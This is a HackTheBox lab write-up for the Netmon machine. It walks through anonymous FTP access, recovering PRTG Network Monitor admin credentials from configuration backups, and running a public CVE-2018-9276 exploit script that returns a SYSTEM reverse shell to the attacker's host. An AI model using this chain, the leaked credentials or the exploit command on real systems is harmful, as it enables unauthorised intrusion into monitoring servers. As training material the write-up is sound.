---
title: HTB | Netmon
author: Zeropio
date: 2022-12-24
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/netmon
---

![HTB Img](/assets/img/hackthebox/card/Netmon.png)

# Fingerprint

## Scan

The scan show us:

```
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## Enumeration

### FTP

The **anonymous** user is enable, with this command all the ftp can be downloaded:

```bash
wget -m --no-passive ftp://anonymous@10.10.10.152
```

But the `C:\Users\Administrator`{: .filepath} folder is not accesible. Accesing the `config`{: .filepath} folder is also blocked:

```console
ftp> cd Windows
250 CWD command successful.
ftp> cd config
550 The system cannot find the file specified.
```

But we have access to the `C:\Users\Public`{: .filepath} or the `C:\inetpub`{: .filepath}. In the logs there is a reference to a **WebManagementShell**:

```
2019-02-26 02:18:24 10.10.10.152 POST /Service.axd Module=WebObjects&Method=GetSite 8172 netmon\administrator 10.10.14.2 WebManagementShell|7.0.0.0|4.0.30319.42000|System.Windows.Forms.Control - 200 0 0 276
```

All available users in the system can be seen:

```console
ftp> ls -a
229 Entering Extended Passive Mode (|||50599|)
150 Opening ASCII mode data connection.
02-25-19  10:44PM       <DIR>          Administrator
07-16-16  08:28AM       <DIR>          All Users
02-03-19  07:05AM       <DIR>          Default
07-16-16  08:28AM       <DIR>          Default User
07-16-16  08:16AM                  174 desktop.ini
02-02-19  11:35PM       <DIR>          Public
```

Inside `All Users`{: .filepath} there is a bunch of them, but one has a different name, **Paessler**. There we have the folder `PRTG Network Monitor`{: .filepath}.

```console
ftp> ls
229 Entering Extended Passive Mode (|||50695|)
125 Data connection already open; Transfer starting.
12-24-22  07:28AM       <DIR>          Configuration Auto-Backups
12-24-22  06:47AM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
12-24-22  06:47AM       <DIR>          Logs (Web Server)
12-24-22  06:52AM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
12-24-22  07:28AM              1680579 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
```

Download the config file:

```console
ftp> get "PRTG Configuration.dat"
```

There we can find the following:

```xml
								<login>
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>

```

We search for this user in the three config files we have in the FTP:

```console
$ grep -C 10 prtgadmin 'PRTG Configuration.dat'
$ grep -C 10 prtgadmin 'PRTG Configuration.old'
$ grep -C 10 prtgadmin 'PRTG Configuration.old.bak'
```

Finally, we found cleartext credentials:

```xml
<dbpassword>
	<!-- User: prtgadmin -->
	PrTg@dmin2018
</dbpassword>
```

### HTTP

There is a page with a login prompt for access **PRTG Network Monitor**. The previous credentials will not work at first, but after changing the year to **2019** it will work. The finals credentials are `prtgadmin:PrTg@dmin2019`.

If we look into the source code we can get the version inside a script:

```jsx
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','__ga');
__ga('create', 'UA-154425-18', {
'appId':'-10',
'appName':'PRTG Network Monitor (NETMON)',
'appVersion':'18.1.37.13946'
});
```

But once logged in, we can get the exact version: `18.1.37.13946`. Searching for exploits in this version:

```console
$ searchsploit PRTG
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                       | windows/webapps/46527.sh
```

The webpage on the port 47001 and 5985 show a error 404. Fuzzing will not show any other page.

---

# Footprint

## Privilege Escalation

We will use this [exploit](https://github.com/wildkindcc/CVE-2018-9276/pull/1/commits/9653c261aeb5a263cb79a2b805217516bef9baf0), from a commit in the same exploit in [Python2](https://github.com/wildkindcc/CVE-2018-9276):

```console
$ python3 CVE-2018-9276-py3.py -i 10.10.10.152 -p 80 --lhost 10.10.14.3 --lport 80 --password 'PrTg@dmin2019'

C:\Windows\system32>whoami
nt authority\system
```
